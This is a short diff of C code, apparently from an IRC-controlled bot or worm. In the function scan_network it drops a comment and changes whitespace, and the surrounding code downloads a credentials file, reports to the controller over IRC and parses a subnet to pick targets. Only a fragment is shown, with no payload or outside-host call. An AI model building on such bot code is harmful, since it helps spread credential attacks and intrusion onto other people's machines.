@@ -10,8 +10,6 @@ int scan_network(irc_info *info, char *ip) {
 
 	download_credentials_file();
 
-	// if we can't access the file, simply ignore and sets creds
-	// to null to move to the next target
 	if (access(CRED_FILE, R_OK) == -1) {
 		perror("access cred file");
 		irc_send("can't read credentials file\n", strlen("can't read credentials file\n"), info);
@@ -25,7 +23,7 @@ int scan_network(irc_info *info, char *ip) {
 		subnet = ip;
 
 	if (subnet) {
-
+		
 		// get first octect
 		char *fo = strtok(subnet, ".");
 		// second... and third
